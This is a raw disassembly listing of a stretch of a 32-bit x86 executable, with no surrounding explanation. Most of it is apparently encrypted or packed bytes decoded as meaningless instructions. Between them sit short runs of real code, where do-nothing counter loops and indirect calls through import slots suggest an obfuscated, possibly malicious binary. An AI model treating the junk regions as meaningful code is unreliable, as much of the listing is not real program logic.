  409c85:	std    
  409c86:	(bad)  
  409c87:	icebp  
  409c88:	pop    ebp
  409c89:	dec    esi
  409c8a:	mov    bl,0x4c
  409c8c:	test   DWORD PTR [ecx-0x7f89bf5e],edi
  409c92:	or     DWORD PTR [ecx-0x73054f67],esi
  409c98:	sbb    bl,BYTE PTR ds:0x24c69c28
  409c9e:	or     cl,ch
  409ca0:	mov    dh,BYTE PTR [ebx+edx*2-0x57c4a461]
  409ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca8:	jns    0x409d15
  409caa:	cld    
  409cab:	and    al,0x24
  409cad:	or     bh,BYTE PTR [edx]
  409caf:	sbb    DWORD PTR ds:0x4e696597,0xd
  409cb6:	es out dx,eax
  409cb8:	into   
  409cb9:	cwde   
  409cba:	cmc    
  409cbb:	mov    al,0x51
  409cbd:	pushf  
  409cbe:	mov    eax,0xee251450
  409cc3:	inc    esp
  409cc4:	bnd lock jmp 0x409ca6
  409cc8:	push   esp
  409cc9:	cmp    BYTE PTR [ecx],cl
  409ccb:	sbb    BYTE PTR [ebp+0x7849fec7],bh
  409cd1:	or     al,0xeb
  409cd3:	test   DWORD PTR [eax],edi
  409cd5:	and    edx,DWORD PTR [eax+0x1692bca6]
  409cdb:	adc    al,BYTE PTR [eax-0x2a]
  409cde:	adc    BYTE PTR [ecx],bh
  409ce0:	mov    dh,0x52
  409ce2:	xchg   BYTE PTR [eax+edx*1+0x1a],bh
  409ce6:	cld    
  409ce7:	gs jmp 0x3aad21b8
  409ced:	mov    bl,al
  409cef:	(bad)  
  409cf0:	iret   
  409cf1:	adc    eax,0x66e29f02
  409cf6:	add    ecx,DWORD PTR [edi]
  409cf8:	sub    dh,BYTE PTR [esi-0x31e91d05]
  409cfe:	jge    0x409d6c
  409d00:	sbb    al,0x80
  409d02:	jp     0x409d5c
  409d04:	stos   DWORD PTR es:[edi],eax
  409d05:	out    dx,eax
  409d06:	cwde   
  409d07:	sub    bl,BYTE PTR [eax-0x7e]
  409d0a:	adc    DWORD PTR [eax-0x3f],ebx
  409d0d:	adc    esi,DWORD PTR [ecx]
  409d0f:	sbb    bh,ch
  409d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d12:	ja     0x409d04
  409d14:	clc    
  409d15:	mov    ds:0x174e95f7,al
  409d1a:	addr16 dec ebx
  409d1c:	fst    QWORD PTR [edx]
  409d1e:	xor    cl,dl
  409d20:	jle    0x409ca8
  409d22:	mov    BYTE PTR [ebp+0x17b22c76],ah
  409d28:	inc    ebp
  409d29:	mov    ch,BYTE PTR [edx+0x4ca117c4]
  409d2f:	sbb    dl,ah
  409d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d32:	daa    
  409d33:	xor    esp,DWORD PTR [ecx+0x52]
  409d36:	call   0x87dc6197
  409d3b:	es repnz adc eax,edi
  409d3f:	mov    bl,BYTE PTR [ebx+eax*2+0x77]
  409d43:	jg     0x409d9e
  409d45:	sbb    al,0x1c
  409d47:	or     dl,BYTE PTR [edi-0x41]
  409d4a:	loop   0x409d95
  409d4c:	sub    BYTE PTR [eax+0xf28af4f],bl
  409d52:	scas   al,BYTE PTR es:[edi]
  409d53:	out    0xc7,eax
  409d55:	and    eax,DWORD PTR [esi+0x7185ad98]
  409d5b:	mov    dl,0xe8
  409d5d:	fdivr  QWORD PTR [edx+0x4c]
  409d60:	xor    eax,0xc09404a
  409d65:	stc    
  409d66:	aad    0xa3
  409d68:	pop    ebp
  409d69:	fs jle 0x409dc5
  409d6c:	loop   0x409dcc
  409d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d6f:	push   ecx
  409d70:	ret    0x4b31
  409d73:	je     0x409d1a
  409d75:	xchg   ecx,eax
  409d76:	imul   esp,DWORD PTR ds:0x3f090bdb,0xffffffa8
  409d7d:	dec    ebx
  409d7e:	bnd jns 0x409d88
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433617,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	jns    0x409d6b
  409dc0:	test   dl,dl
  409dc2:	cmp    dl,ah
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	xor    eax,0x6cd22a24
  409dcf:	push   esi
  409dd0:	push   eax
  409dd1:	xchg   BYTE PTR [edi-0x5b],ah
  409dd4:	fnsave [ebx+0x70]
  409dd7:	push   esp
  409dd8:	xchg   ebx,eax
  409dd9:	pop    ss
  409dda:	out    0x7c,eax
  409ddc:	sbb    esp,DWORD PTR [ebp+0x3be0620b]
  409de2:	mov    ch,0x9e
  409de4:	idiv   BYTE PTR [ebx]
  409de6:	dec    eax
  409de7:	les    esi,FWORD PTR [ebx+0x5d376855]
  409ded:	xor    ch,BYTE PTR [edx+0x1310c0b]
  409df3:	bound  esi,QWORD PTR [eax-0x2f]
  409df6:	sub    edx,0xdd209a6e
  409dfc:	xor    BYTE PTR [ecx-0x2b],0x34
  409e00:	inc    ecx
  409e01:	pop    esp
  409e02:	ja     0x409e64
  409e04:	jl     0x409dc8
  409e06:	fcmove st,st(1)
  409e08:	mov    edx,0x2123796e
  409e0d:	push   ebx
  409e0e:	mov    WORD PTR [ebx-0x4ed0fe4d],fs
  409e14:	dec    edi
  409e15:	mov    ecx,0xfcd1e803
  409e1a:	sbb    ch,BYTE PTR [edi+0x6]
  409e1d:	push   edx
  409e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e1f:	dec    edi
  409e20:	clc    
  409e21:	ins    DWORD PTR es:[edi],dx
  409e22:	ret    0x732d
  409e25:	dec    esp
  409e26:	fwait
  409e27:	xchg   ebx,eax
  409e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e29:	dec    ecx
  409e2a:	fistp  QWORD PTR [ebx]
  409e2c:	(bad)  
  409e2d:	jb     0x409de4
  409e2f:	popa   
  409e30:	cmp    eax,0x3a8a4409
  409e35:	loop   0x409dce
  409e37:	push   si
  409e39:	call   0x1ea1aa06
  409e3e:	pop    es
  409e3f:	mov    ah,al
  409e41:	sbb    eax,0xffffffd4
  409e44:	mov    cl,0x1f
  409e46:	xchg   DWORD PTR [edi+0x5b],ebp
  409e49:	mov    ebx,0x536f9fc9
  409e4e:	mov    edi,0xbba2cd91
  409e53:	add    al,0xd
  409e55:	into   
  409e56:	mov    cl,0x9b
  409e58:	pop    eax
  409e59:	neg    DWORD PTR [ebp-0x25]
  409e5c:	call   0x83b19fcf
  409e61:	enter  0xf725,0xd8
  409e65:	gs cwde 
  409e67:	int3   
  409e68:	repnz sbb ah,BYTE PTR ss:[ecx+0x2c]
  409e6d:	ja     0x409ea0
  409e6f:	mov    ah,0xfe
  409e71:	sub    BYTE PTR [edi+0x4510d8f2],bl
  409e77:	fdiv   QWORD PTR [ecx-0x7f5b8de2]
  409e7d:	pop    esp
  409e7e:	mov    ah,0xd3
  409e80:	js     0x409ea9
  409e82:	mov    esp,DWORD PTR [edi]
  409e84:	popf   
  409e85:	mov    ch,0xc0
  409e87:	enter  0x2e17,0x49
  409e8b:	ss fcom st(0)
  409e8e:	ror    BYTE PTR [edx+0x48],0x2b
  409e92:	loopne 0x409eb3
  409e94:	add    bh,dl
  409e96:	test   al,0x9a
  409e98:	in     al,0x61
  409e9a:	jecxz  0x409e56
  409e9c:	mov    ds:0x9c631a2c,eax
  409ea1:	mov    WORD PTR [eax-0x26],?
  409ea4:	mov    ch,ch
  409ea6:	mov    edx,0x6606870
  409eab:	sub    dh,ch
  409ead:	imul   esi,edx,0x12f39085
  409eb3:	dec    esi
  409eb4:	arpl   WORD PTR [esp+ebx*1],dx
  409eb7:	out    dx,eax
  409eb8:	loopne 0x409e69
  409eba:	test   al,0x91
  409ebc:	add    DWORD PTR [ecx],edx
  409ebe:	popf   
  409ebf:	xchg   ebp,eax
  409ec0:	sub    al,0xee
  409ec2:	cs mov bh,0x7b
  409ec5:	(bad)  
  409ec6:	dec    edx
  409ec7:	(bad)  
  409ec8:	dec    esp
  409ec9:	inc    ebp
  409eca:	adc    dh,BYTE PTR [esi-0xbe3910f]
  409ed0:	and    al,0x72
  409ed2:	mov    ds:0x2b7c67a7,eax
  409ed7:	mov    bh,0xbc
  409ed9:	test   DWORD PTR [edi],edi
  409edb:	mov    edx,0x11481d78
  409ee0:	js     0x409e95
  409ee2:	js     0x409ecc
  409ee4:	lock ffree st(3)
  409ee7:	mov    ch,0x31
  409ee9:	xor    ebx,ebx
  409eeb:	sub    al,0x60
  409eed:	xor    eax,0x568e4d50
  409ef2:	jle    0x409f14
  409ef4:	sbb    al,0xbf
  409ef6:	ins    DWORD PTR es:[edi],dx
  409ef7:	sti    
  409ef8:	push   edi
  409ef9:	adc    eax,0x26be027
  409efe:	dec    ebp
  409eff:	cmp    DWORD PTR [edx-0x33],esi
  409f02:	ret    
  409f03:	pushf  
  409f04:	sbb    eax,0x708f56a8
  409f09:	xor    edi,DWORD PTR [eax]
  409f0b:	jo     0x409f46
  409f0d:	sti    
  409f0e:	jb     0x409f4f
  409f10:	fmul   QWORD PTR [esi]
  409f12:	push   ecx
  409f13:	arpl   cx,dx
  409f15:	shr    DWORD PTR [eax+edx*8-0x2a5f0c72],0xe3
  409f1d:	sbb    BYTE PTR [eax-0x33],bh
  409f20:	pop    edi
  409f21:	or     BYTE PTR [edx+0xdfeabda],bh
  409f27:	and    BYTE PTR [ebx],bl
  409f29:	adc    al,0x1e
  409f2b:	inc    ecx
  409f2c:	inc    edx
  409f2d:	pusha  
  409f2e:	(bad)  
  409f2f:	(bad)  
  409f30:	pushf  
  409f31:	addr16 jle 0x409f78
  409f34:	push   0xffffffc2
  409f36:	xor    ecx,ebp
  409f38:	cdq    
  409f39:	test   DWORD PTR [edx],edi
  409f3b:	gs mov dl,0x7f
  409f3e:	popf   
  409f3f:	xchg   ebx,eax
  409f40:	pushf  
  409f41:	clc    
  409f42:	mov    cs,WORD PTR [ebp+ebx*4+0x69]
  409f46:	ret    
  409f47:	cdq    
  409f48:	fisubr DWORD PTR [edi+0x55fd1c0b]
  409f4e:	bound  esi,QWORD PTR [edi]
  409f50:	lea    esi,[ecx]
  409f52:	push   edx
  409f53:	pop    es
  409f54:	ror    DWORD PTR [ecx],0x9c
  409f57:	aas    
  409f58:	cmp    ebp,0xffffffa7
  409f5b:	out    dx,eax
  409f5c:	retf   0x1623
  409f5f:	inc    esi
  409f60:	ret    
  409f61:	jg     0x409fcb
  409f63:	inc    ebp
  409f64:	jl     0x409fb8
  409f66:	mov    cl,0x4d
  409f68:	fisttp DWORD PTR [ebx]
  409f6a:	ret    0x15b8
  409f6d:	pop    edx
  409f6e:	or     al,0x4d
  409f70:	mov    edi,0xf94ab0fa
  409f75:	pop    esp
  409f76:	or     al,0x35
  409f78:	inc    eax
  409f79:	xchg   esp,eax
  409f7a:	out    0xf4,al
  409f7c:	and    DWORD PTR [edi],0xffffff98
  409f7f:	jae    0x409f41
  409f81:	sahf   
  409f82:	sbb    BYTE PTR [esi-0x3f61e807],dl
  409f88:	scas   al,BYTE PTR es:[edi]
  409f89:	mov    edi,DWORD PTR [esi+0x661763a7]
  409f8f:	mov    bl,0x3c
  409f91:	sbb    BYTE PTR [ebx],al
  409f93:	inc    DWORD PTR [edx-0x4b]
  409f96:	int    0xaf
  409f98:	neg    BYTE PTR [ecx]
  409f9a:	adc    eax,0xdcae999d
  409f9f:	nop
  409fa0:	repz loope 0x409fc1
  409fa3:	loop   0x409f92
  409fa5:	retf   0x2ff5
  409fa8:	pop    esp
  409fa9:	fadd   DWORD PTR [ebp+0x19]
  409fac:	in     al,0xcb
  409fae:	and    al,0x4a
  409fb0:	lock inc eax
  409fb2:	mov    ds:0x7711a92c,eax
  409fb7:	out    0x2,al
  409fb9:	cmp    DWORD PTR [ebx-0x22e896a9],0x7423c124
  409fc3:	jl     0x409fd1
  409fc5:	push   cs
  409fc6:	mov    ecx,DWORD PTR [ecx+0x6ec0613a]
  409fcc:	pop    ebx
  409fcd:	ins    BYTE PTR es:[edi],dx
  409fce:	test   DWORD PTR [eax],ebx
  409fd0:	mov    DWORD PTR [eax-0x3e],edi
  409fd3:	fistp  WORD PTR [ecx]
  409fd5:	push   ss
  409fd6:	(bad)  
  409fd7:	aaa    
  409fd8:	fldenv [ebp-0x9f9c19]
  409fde:	and    DWORD PTR [ecx-0xe613235],0x9c347ae
  409fe8:	scas   al,BYTE PTR es:[edi]
  409fe9:	jo     0x409f77
  409feb:	pusha  
  409fec:	retf   0x2c15
  409fef:	fcom   DWORD PTR [esi-0x36]
  409ff2:	sub    DWORD PTR [eax-0x7a7556b6],esp
  409ff8:	out    0xb4,al
  409ffa:	cmp    dl,BYTE PTR [edi+0x33]
  409ffd:	jp     0x40a01e
  409fff:	and    DWORD PTR [edi+0x71],0x5f
  40a003:	push   ds
  40a004:	lahf   
  40a005:	out    dx,al
  40a006:	mov    ah,0x7c
  40a008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a009:	dec    esi
  40a00a:	push   eax
  40a00b:	ins    BYTE PTR es:[edi],dx
  40a00c:	in     eax,dx
  40a00d:	fs fscale 
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	pop    ecx
  40a127:	jle    0x40a19a
  40a129:	adc    al,BYTE PTR [edx+0x387e7ee0]
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a138
  40a133:	push   ecx
  40a134:	sbb    BYTE PTR [ecx+0xd],dh
  40a137:	mov    dh,0x2
  40a139:	dec    edx
  40a13a:	dec    ecx
  40a13b:	push   es
  40a13c:	dec    esi
  40a13d:	sbb    bl,BYTE PTR [ebx]
  40a13f:	shr    BYTE PTR [eax],1
  40a141:	jmp    0x40a144
  40a143:	ja     0x40a127
  40a145:	retf   0x3dc1
  40a148:	pop    es
  40a149:	mul    BYTE PTR [esi+0x62e29f8a]
  40a14f:	inc    ebx
  40a150:	inc    eax
  40a151:	stos   BYTE PTR es:[edi],al
  40a152:	xchg   DWORD PTR [edx+eiz*1+0x28db4a05],esi
  40a159:	inc    bp
  40a15b:	sbb    edx,esi
  40a15d:	or     DWORD PTR [ebp-0x6a],esi
  40a160:	sahf   
  40a161:	and    dh,bl
  40a163:	inc    esi
  40a164:	mov    ss,edi
  40a166:	adc    edx,DWORD PTR [eax]
  40a168:	das    
  40a169:	and    BYTE PTR [edi+0x28dcf6e9],bl
  40a16f:	sbb    al,0xb1
  40a171:	loopne 0x40a146
  40a173:	adc    BYTE PTR [edi-0x7d],bl
  40a176:	sbb    DWORD PTR [edx-0x78],eax
  40a179:	dec    esi
  40a17a:	adc    al,0x3d
  40a17c:	mov    DWORD PTR [ebx],edx
  40a17e:	sbb    eax,0x6c5cd662
  40a183:	add    ch,al
  40a185:	loop   0x40a137
  40a187:	mov    ebx,0x542a1298
  40a18c:	ror    DWORD PTR [ecx],cl
  40a18e:	add    BYTE PTR [eax],0x81
  40a191:	call   0xf4df68ff
  40a196:	push   es
  40a197:	inc    esp
  40a198:	test   DWORD PTR [edi],edi
  40a19a:	inc    eax
  40a19b:	sbb    edx,DWORD PTR [edx-0x500d0f35]
  40a1a1:	mov    ch,0xe7
  40a1a3:	sub    dh,BYTE PTR [edi-0x1]
  40a1a6:	inc    ebp
  40a1a7:	jp     0x40a19a
  40a1a9:	loope  0x40a14d
  40a1ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1ac:	pop    ebp
  40a1ad:	jne    0x40a1b4
  40a1af:	lahf   
  40a1b0:	add    DWORD PTR [edx-0x2836a4e3],ebp
  40a1b6:	xchg   ebp,eax
  40a1b7:	jp     0x40a204
  40a1b9:	dec    ecx
  40a1ba:	cli    
  40a1bb:	jg     0x40a173
  40a1bd:	mov    edi,0x7de195d4
  40a1c2:	cwde   
  40a1c3:	mov    ch,0xaa
  40a1c5:	lahf   
  40a1c6:	mov    eax,0x4e74c5a0
  40a1cb:	ficomp DWORD PTR [esi]
  40a1cd:	mov    edx,0xfccbd81f
  40a1d2:	bound  esp,QWORD PTR fs:[edi-0x56ec107e]
  40a1d9:	jbe    0x40a1ff
  40a1db:	jmp    0xf6e76604
  40a1e0:	imul   ebp,DWORD PTR [edx-0x77],0x150a6c37
  40a1e7:	sub    eax,0x24f5f658
  40a1ec:	aad    0xc
  40a1ee:	sbb    cl,ch
  40a1f0:	cld    
  40a1f1:	idiv   BYTE PTR [esp+ebx*8+0x57]
  40a1f5:	test   al,0xb3
  40a1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f8:	and    ch,dh
  40a1fa:	test   eax,0x5fa53605
  40a1ff:	cld    
  40a200:	pop    esi
  40a201:	mov    ah,0x15
  40a203:	aam    0x60
  40a205:	pop    ecx
  40a206:	fst    DWORD PTR [esi+ecx*8-0x9705f9f]
  40a20d:	dec    esi
  40a20e:	or     DWORD PTR [edx],esp
  40a210:	lods   eax,DWORD PTR ds:[esi]
  40a211:	pop    ebp
  40a212:	cwde   
  40a213:	sub    DWORD PTR [esi+0x33],esi
  40a216:	out    0x86,eax
  40a218:	and    DWORD PTR [ebx+0x57],ebx
  40a21b:	mov    esp,0xdbc5229
  40a220:	jmp    0xbda2eb11
  40a225:	adc    bh,BYTE PTR [ebx+0x15]
  40a228:	dec    esi
  40a229:	mov    al,BYTE PTR [esi-0x1c52f9bf]
  40a22f:	inc    ebp
  40a230:	jno    0x40a21b
  40a232:	xchg   DWORD PTR [ebx-0x1159c9e6],esi
  40a238:	jmp    0x5a21:0xf11de39
  40a23f:	test   eax,0x898cac3a
  40a244:	jg     0x40a29a
  40a246:	pop    edx
  40a247:	add    esp,DWORD PTR [edi]
  40a249:	xor    ebp,edx
  40a24b:	sub    ebp,esp
  40a24d:	loopne 0x40a1d8
  40a24f:	xor    DWORD PTR ds:0x860a7fed,ebx
  40a255:	pop    edi
  40a256:	outs   dx,BYTE PTR ds:[esi]
  40a257:	mov    esp,ecx
  40a259:	fidivr DWORD PTR [ebx]
  40a25b:	pop    ss
  40a25c:	mov    dh,BYTE PTR [eax+0x55]
  40a25f:	xor    al,0x9
  40a261:	mov    WORD PTR [ebp+0x47a8ec91],ss
  40a267:	das    
  40a268:	mov    ch,0x8f
  40a26a:	das    
  40a26b:	stc    
  40a26c:	into   
  40a26d:	call   0x1328:0x3b6dd86b
  40a274:	jp     0x40a21a
  40a276:	sub    eax,0x21fadfe1
  40a27b:	xchg   ebx,eax
  40a27c:	lock ss in eax,dx
  40a27f:	out    dx,eax
  40a280:	mov    al,0xb9
  40a282:	mov    bl,0x8f
  40a284:	ins    DWORD PTR es:[edi],dx
  40a285:	lahf   
  40a286:	sub    ah,0xd
  40a289:	xchg   esi,eax
  40a28a:	dec    ebp
  40a28b:	and    DWORD PTR [edx+0x6dca7f3e],ebx
  40a291:	cmp    al,0x9c
  40a293:	push   ebx
  40a294:	pushf  
  40a295:	call   0xcd08:0xffa30e29
  40a29c:	sbb    BYTE PTR [esi-0x3d1d5274],ah
  40a2a2:	mov    esi,DWORD PTR [ecx]
  40a2a4:	icebp  
  40a2a5:	out    0xb5,al
  40a2a7:	shr    bl,1
  40a2a9:	push   ebx
  40a2aa:	and    DWORD PTR [ebp+0x74],ebx
  40a2ad:	cmc    
  40a2ae:	ds (bad) 
  40a2b0:	loop   0x40a2ea
  40a2b2:	mov    DWORD PTR ds:0xc7a59761,edi
  40a2b8:	das    
  40a2b9:	mov    ebp,0x92879b94
  40a2be:	in     al,dx
  40a2bf:	xchg   esp,eax
  40a2c0:	mov    esp,0x6b5ae60c
  40a2c5:	test   BYTE PTR [ebp+0x0],dh
  40a2c8:	sbb    ebp,DWORD PTR [ebx-0x6b]
  40a2cb:	cmc    
  40a2cc:	mov    al,ds:0x8e53dd7d
  40a2d1:	call   0xab7b:0x522437a0
  40a2d8:	fnstcw WORD PTR [edx]
  40a2da:	call   0xeea022ea
  40a2df:	aaa    
  40a2e0:	pushf  
  40a2e1:	gs in  al,0x9
  40a2e4:	xchg   edi,eax
  40a2e5:	test   ch,bh
  40a2e7:	sub    al,BYTE PTR [esi-0x2e]
  40a2ea:	adc    DWORD PTR [ebx+0x2],ebx
  40a2ed:	in     al,0x1f
  40a2ef:	mov    dh,0xfe
  40a2f1:	dec    esp
  40a2f2:	xor    ebx,DWORD PTR [edx]
  40a2f4:	sbb    eax,0xad45b37e
  40a2f9:	js     0x40a283
  40a2fb:	adc    BYTE PTR [esp+edx*1-0x7abfee12],dh
  40a302:	cmp    eax,0x24516462
  40a307:	push   ecx
  40a308:	xor    al,BYTE PTR [edi+0x3cd22e92]
  40a30e:	xchg   DWORD PTR [esi+0x54c2a30a],eax
  40a314:	inc    esi
  40a315:	mov    dh,0xea
  40a317:	ds add edi,ebx
  40a31a:	repnz pop ecx
  40a31c:	and    ch,BYTE PTR [ebp-0x3194feac]
  40a322:	or     dl,BYTE PTR [ebx+edx*1+0x3f75520b]
  40a329:	pop    ds
  40a32a:	mov    bl,0x36
  40a32c:	adc    al,0x19
  40a32e:	push   ss
  40a32f:	sub    ch,BYTE PTR [ebp+0x14998aa6]
  40a335:	data16 into 
  40a337:	jnp    0x40a366
  40a339:	bound  esp,QWORD PTR [eax]
  40a33b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a33c:	mov    ds:0x4e7787b6,eax
  40a342:	pop    edi
  40a343:	or     DWORD PTR [edi+0x35],0xffffffab
  40a347:	outs   dx,BYTE PTR ds:[esi]
  40a348:	sbb    al,0xdf
  40a34a:	dec    edx
  40a34b:	lods   al,BYTE PTR ds:[esi]
  40a34c:	lods   eax,DWORD PTR ds:[esi]
  40a34d:	ins    DWORD PTR es:[edi],dx
  40a34e:	ss jg  0x40a2df
  40a351:	xor    edx,esi
  40a353:	xor    al,0x59
  40a355:	cmp    BYTE PTR [eax],bl
  40a357:	out    dx,eax
  40a358:	dec    esi
  40a359:	sub    al,ah
  40a35b:	and    al,0xbf
  40a35d:	mov    ah,0x6e
  40a35f:	sbb    ebp,DWORD PTR [esi+0x53580b79]
  40a365:	jmp    0x40a368
  40a367:	(bad)
  40a36a:	jno    0x40a3bc
  40a36c:	shl    BYTE PTR [esi],cl
  40a36e:	lds    ebx,FWORD PTR [edx-0x27ebf5dc]
  40a374:	sbb    DWORD PTR [ebx+0x45],ebx
  40a377:	mov    ecx,0x33e84d8b
  40a37c:	enter  0x2581,0xfb
  40a380:	xor    eax,0x43
  40a385:	add    BYTE PTR [eax],al
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	mov    ebp,0x4cef961b
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	cmp    BYTE PTR [eax],0xcc
  40a4aa:	push   ecx
  40a4ab:	cmc    
  40a4ac:	mov    bh,0x88
  40a4ae:	es sbb al,0x9
  40a4b1:	stos   DWORD PTR es:[edi],eax
  40a4b2:	mov    edi,0x11780442
  40a4b7:	push   ebp
  40a4b8:	scas   al,BYTE PTR es:[edi]
  40a4b9:	xchg   DWORD PTR [ebx-0x3448a532],esp
  40a4bf:	mov    esp,0xa26a652e
  40a4c4:	inc    ecx
  40a4c5:	mov    esp,0x76276a41
  40a4ca:	jne    0x40a4c6
  40a4cc:	or     DWORD PTR [esi+eax*2],ecx
  40a4cf:	xchg   edi,eax
  40a4d0:	mov    ebx,0x97e9274b
  40a4d5:	xor    DWORD PTR [edx-0x2a77fb03],edi
  40a4db:	mov    ds:0xae999a74,eax
  40a4e0:	lock sub dh,BYTE PTR [eax+0x2b]
  40a4e4:	xchg   esp,eax
  40a4e5:	leave  
  40a4e6:	add    BYTE PTR [ebx],dh
  40a4e8:	jnp    0x40a497
  40a4ea:	jne    0x40a517
  40a4ec:	pop    esp
  40a4ed:	loop   0x40a484
  40a4ef:	dec    edx
  40a4f0:	outs   dx,BYTE PTR ds:[esi]
  40a4f1:	xchg   ebp,eax
  40a4f2:	ret    0xef3a
  40a4f5:	sub    BYTE PTR [eax],0xdd
  40a4f8:	lock jle 0x40a4ed
  40a4fb:	imul   ebp,DWORD PTR [ecx+0x225f361f],0xd
